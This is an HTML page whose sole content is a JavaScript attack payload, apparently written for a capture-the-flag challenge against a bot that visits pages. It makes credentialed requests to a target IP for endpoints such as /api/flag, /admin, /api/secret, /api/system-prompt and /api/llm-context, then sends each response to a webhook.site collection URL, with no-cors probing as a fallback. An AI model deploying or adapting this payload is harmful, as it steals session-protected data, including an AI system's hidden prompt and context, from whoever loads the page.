<!DOCTYPE html>
<html>
<body>
<script>
var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';

// Bot ke saath CTF API call - same origin isliye credentials bhi jayenge
var apis = [
  '/api/drawings',
  '/api/flag',
  '/flag',
  '/admin',
  '/api/admin',
  '/api/profile',
  '/api/bot',
  '/api/me',
  '/api/user',
  '/api/secret',
  '/api/llm-context',
  '/api/system-prompt',
  '/api/config'
];

apis.forEach(function(ep) {
  fetch('http://151.115.166.43:17947' + ep, {
    credentials: 'include',
    mode: 'cors'
  })
  .then(function(r) {
    return r.text().then(function(text) {
      fetch(w + '?status=' + r.status + '&ep=' + encodeURIComponent(ep) + '&d=' + encodeURIComponent(text.substring(0, 500)));
    });
  })
  .catch(function(e) {
    // CORS blocked - try no-cors to at least confirm existence
    fetch('http://151.115.166.43:17947' + ep, {mode: 'no-cors', credentials: 'include'})
      .then(function() {
        fetch(w + '?nocors_ok=' + encodeURIComponent(ep));
      })
      .catch(function() {
        fetch(w + '?blocked=' + encodeURIComponent(ep));
      });
  });
});
</script>
</body>
</html>
